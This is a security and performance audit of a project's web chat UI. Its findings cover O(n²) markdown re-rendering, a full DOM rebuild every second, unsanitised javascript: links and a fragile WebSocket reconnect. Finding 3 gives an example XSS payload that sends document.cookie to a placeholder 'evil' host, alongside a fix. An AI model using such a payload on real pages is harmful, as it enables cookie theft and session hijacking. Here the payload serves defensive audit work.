# R3 Web/GUI Audit (READ-ONLY)

Date: 2026-09-19. Scope: kern/web.py, kern/gui.py, kern/static/*.
Status: IN PROGRESS


## Finding 1 — Assistant message fully re-parsed on every streaming delta (O(n²)) — SEV: HIGH (perf/smoothness)
- File: kern/static/app.js:66
- Proof: `if (ev.kind==='assistant_delta') { if(!live) live=bubble('assistant'); live.content.replaceChildren(); renderText(live.content, live.text += ev.text); }`
  Every delta wipes the container and re-runs the full markdown parser over the entire accumulated text. For a 4k-token reply with ~200 deltas this is ~200 full re-parses; text selection is destroyed mid-stream and long replies visibly judder.
- Minimal fix: in renderText, keep a cursor of already-committed blocks; only re-render the LAST open block (paragraph/code) on deltas, append completed blocks once. Or debounce: buffer deltas and renderText at most every ~80ms via requestAnimationFrame.

## Finding 2 — Full transcript DOM rebuild every second while running — SEV: HIGH (perf, flicker, lost state)
- File: kern/static/app.js:64 + :93-94
- Proof: `setInterval`-style `if (running) setTimeout(state,1000);` (line 64) → state() → renderEvents(events) → `$('messages').replaceChildren()` (line 94) rebuilds EVERY message, tool card and re-stringifies all tool args/results each second. Open <details> cards collapse back, scroll jumps, DOM churn grows O(n) per second for the whole session.
- Minimal fix: keep last event count/index; append only new events (events.slice(lastRendered)) instead of replaceChildren; skip renderEvents entirely when no new events arrived.

## Finding 3 — javascript: URLs in markdown links are not sanitized — SEV: MEDIUM (XSS vector)
- File: kern/static/app.js:47
- Proof: `part.textContent = token.slice(1, split); part.href = token.slice(split + 2, -1);` — href assigned raw. A model/tool-influenced message containing `[click](javascript:fetch('//evil/'+document.cookie))` yields a clickable javascript: link. Text nodes elsewhere are safe (createTextNode), so this is the only injection path in the web UI.
- Minimal fix: `const url = token.slice(split+2,-1); if (/^(https?:|mailto:)/i.test(url)) part.href = url; else { part.textContent = token; continue; }`. Add CSP header `default-src 'self'; script-src 'self'` in web.py index_route as defense in depth.

## Finding 4 — WebSocket reconnect is single-shot; no connection status UI — SEV: MEDIUM (reliability)
- File: kern/static/app.js:3-8 (connect), :69-75 (onclose), kern/web.py:94-106 (no ping/pong)
- Proof: connect() retries once after 300ms (`if (tries < 1) setTimeout(...)`). onclose → connect() gives effectively one more attempt; if the server is briefly restarting the UI dies silently — composer stays disabled via `socket?.readyState !== OPEN` (line 16) with no banner, user must manually reload. Server sends no keepalive pings, so an idle socket killed by OS sleep/proxy is only noticed on next send.
- Minimal fix: exponential backoff retry loop (300ms→20s, unlimited tries) + a `#conn` status pill (connecting/online/reconnecting) in the topbar; server-side: aiohttp heartbeat=25 on WebSocketResponse.
